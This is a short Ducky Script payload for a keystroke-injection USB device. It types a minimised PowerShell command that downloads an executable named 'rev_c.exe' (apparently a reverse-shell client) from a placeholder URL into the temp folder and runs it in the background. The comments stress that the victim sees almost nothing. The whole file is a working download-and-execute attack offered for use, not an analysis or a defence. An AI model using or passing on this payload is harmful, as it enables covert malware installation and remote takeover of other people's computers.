REM Fully original work, you will  need to adjust the delays depending on what HID device you are using
REM One-line code that download the executable from your URL, saves in temp folder and then starts a 
REM process in the background.
REM The only visible part is opening run and typing the one-liner very fast. Powershell windows is minimized
REM and closes after program finishes executing.

GUI R
DELAY 2
STRING cmd /C "start /MIN cmd /C powershell "$url = "YOUR-URL/rev_c.exe"; $outpath = "$env:temp/rev_c.exe"; 
STRING Invoke-WebRequest -Uri $url -OutFile $outpath; Start-Job -Filepath "$env:temp/rev_c.exe"""
DELAY 1
ENTER
